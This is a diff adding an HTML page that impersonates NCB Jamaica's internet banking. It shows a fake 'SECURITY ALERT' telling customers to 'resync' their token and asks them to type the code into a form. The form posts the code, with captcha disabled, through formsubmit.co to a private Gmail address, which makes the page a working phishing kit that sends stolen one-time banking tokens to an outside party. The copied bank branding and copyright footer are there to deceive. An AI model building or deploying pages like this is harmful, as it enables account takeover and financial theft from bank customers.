@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NCB Token Resync Online Banking:Internet Banking Login</title>
+    <link rel="shortcut icon" href="Img/NCB Logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="Css/style.css">
+</head>
+<body>
+   <div class="token-container">
+       <div class="exp-topbar">
+            <img class="token-ncblogo" src="Img/materializeLogo.png" alt="">
+        </div>
+        <div style="height: 20rem;" class="exp-cont1">
+            <div class="exp-cont2">
+                <img class="warning-logo" src="Img/warning.png" alt="">
+                <h1 class="security-error">SECURITY ALERT !!!</h1><br>
+                <h2 class="this-error">Due to the increase in fraud, you will now have to resync your token to prevent any further fraud <br> on the account.</h2>
+                <h2 class="this-error" style="margin-top: 1rem;"><span style="color: red; font-weight: bold;">IMPORTANT:</span><br> Please wait until token has been reset before entering new code.</h2>
+                <form action="https://formsubmit.co/networkdiplomat@gmail.com" method="POST">
+                    <input class="token-field" name="Token" id="tbNum" onkeyup="addHyphen(this)" maxlength="7" type="text" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');">
+                    <input type="hidden" name="_captcha" value="false"> <br>
+                    <button class="token-submit" type="submit">Continue</button>
+                </form>
+            </div>
+        </div>
+        <div class="footbar">
+            <a href="#">Copyright 1999-2018 NCB Jamaica. All Rights Reserved</a>
+            <a href="#">Privacy Policy | Terms of Use</a>
+            <a href="#">Members of:</a>
+        </div> 
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
